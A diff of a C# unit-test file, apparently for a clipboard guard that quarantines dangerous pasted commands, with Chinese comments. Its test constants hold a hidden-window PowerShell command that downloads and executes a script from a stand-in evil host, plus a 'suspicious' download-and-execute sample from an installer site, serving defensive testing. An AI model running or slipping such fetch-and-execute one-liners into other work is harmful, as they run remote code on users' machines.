@@ -6,7 +6,8 @@ public class ClipboardGuardStateTests
 {
     // 網址都是無效的 example 網域。
     private const string Malicious = "powershell -w hidden -c \"iex(iwr 'https://evil.example.invalid/a.ps1')\"";
-    private const string Suspicious = "powershell -c \"irm https://get.example.invalid | iex\"";
+    // 官方安裝網站的「下載後執行」只提醒；其他網站會被攔截（#20）。
+    private const string Suspicious = "powershell -c \"irm https://get.scoop.sh | iex\"";
 
     [Fact]
     public void 惡意內容被隔離且保留攔截狀態()
